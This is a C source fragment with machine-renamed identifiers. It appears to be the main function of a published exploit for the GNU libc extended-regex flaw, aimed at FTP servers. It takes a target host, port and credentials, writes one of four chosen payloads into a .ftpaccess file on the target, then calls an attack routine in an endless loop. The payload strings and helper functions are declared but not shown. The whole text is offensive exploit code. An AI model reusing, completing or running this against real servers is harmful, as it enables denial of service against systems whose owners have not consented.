
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int FUNC_0 (char*) ;
 int FUNC_1 (char*,char*,char*,char*) ;
 int FUNC_2 (char*,char*,char*,char*,char*,char*) ;
 char* VAR_0 ;
 char* VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 int FUNC_3 (char*,...) ;
 int FUNC_4 () ;

int FUNC_5(int VAR_4,char *VAR_5[])
{

        char *VAR_6,*VAR_7,*VAR_8=((void*)0);
        char VAR_9[]="anonymous",VAR_10[]="cx@127.0.0.1";

        FUNC_3("This is exploit for ERE (GNU libc)\nby Maksymilian Arciemowicz\n\n");

        if(VAR_4<3) FUNC_4();

        char *VAR_11=VAR_5[1];
        char *VAR_12=VAR_5[2];

        if(4<=VAR_4) VAR_6=VAR_5[3];
        else VAR_6=VAR_9;

        if(5<=VAR_4) VAR_7=VAR_5[4];
        else VAR_7=VAR_10;

 if(6<=VAR_4) VAR_8=VAR_5[5];

 if(7<=VAR_4) switch(FUNC_0(VAR_5[6])){
  case 1:
   FUNC_3("Try create .ftpaccess with %s\n\n",VAR_0);
   FUNC_2(VAR_11,VAR_12,VAR_6,VAR_7,VAR_8,VAR_0);
  break;

  case 2:
   FUNC_3("Try create .ftpaccess with %s\n\n",VAR_1);
   FUNC_2(VAR_11,VAR_12,VAR_6,VAR_7,VAR_8,VAR_1);
  break;

  case 3:
   FUNC_3("Try create .ftpaccess with %s\n\n",VAR_2);
   FUNC_2(VAR_11,VAR_12,VAR_6,VAR_7,VAR_8,VAR_2);
  break;

  case 4:
   FUNC_3("Try create .ftpaccess with %s\n\n",VAR_3);
   FUNC_2(VAR_11,VAR_12,VAR_6,VAR_7,VAR_8,VAR_3);
  break;

  default:
   FUNC_4();
  break;
 };

 while(1) FUNC_1(VAR_11,VAR_12,VAR_6,VAR_7);

        return 0;
}
